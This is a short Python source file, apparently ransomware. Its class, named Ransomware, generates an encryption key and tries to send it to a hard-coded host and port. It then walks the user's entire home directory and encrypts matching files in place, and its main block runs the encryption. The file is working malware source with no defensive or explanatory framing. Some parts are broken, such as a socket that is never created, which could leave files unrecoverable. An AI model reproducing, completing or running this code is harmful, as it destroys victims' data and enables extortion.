import sys
import os.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

import shutil
from time import sleep
from pathlib import Path
from typing import Dict, List
from lib.modules import (
    Terminal,
    safe_load
)
from lib.cryptography import Fernet



class Ransomware:
    def __init__(
        self, 
        host: str, 
        port: int
    ) -> None:
        self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        self.host = host
        self.port = port
        self.Private = Fernet(self.key)

    def ConnectServer(self, connected = False) -> None:
        retries = 0
        while not connected and retries < 3:
            try:
                self.server.connect((self.host, self.port))
                self.server.sendall(self.key)
                connected = True
            except:
                retries += 1
                if retries < 3:
                    sleep(10)
                else:
                    Terminal.Reset()
            finally:
                self.server.close()

    def list_file(self) -> Dict[str, List[str]]:
        with open('scripts/extensions.yaml', 'r') as file:
            exts = safe_load(file)

        self.file_categories: Dict[str, List[str]] = {category: [] for category in exts}
        extcategory = {ext: category for category, ext_list in exts.items() for ext in ext_list}

        for entry in Path.home().rglob('*'):
            if entry.is_file() and (ext := entry.suffix.lower()) in extcategory:
                self.file_categories[extcategory[ext]].append(str(entry))

    def process_files(
        self, 
        mode: str
    ) -> None:
        for _, files in self.file_categories.items():
            for file in files:
                temp_file = file + '.temp'
                try:
                    with open(file, 'rb') as original_file, open(temp_file, 'wb') as temp_file:
                        while True:
                            chunk = original_file.read(1024 * 1024 * 10)  # Đọc từng phần của tệp
                            if not chunk:
                                break
                            processed_chunk = self.fernet.encrypt(chunk) if mode == 'encrypt' else self.fernet.decrypt(chunk)
                            temp_file.write(processed_chunk)
                    shutil.move(temp_file.name, file)
                except Exception:
                    if os.path.exists(temp_file.name):
                        os.remove(temp_file.name)
    
    def encrypted(self) -> None:
        self.process_files('encrypt')
    
    def decrypted(self) -> None:
        self.process_files('decrypt')
    
    


if __name__ == '__main__':
    bot = Ransomware('192.168.1.12', 19100)
    bot.list_file()
    bot.encrypted()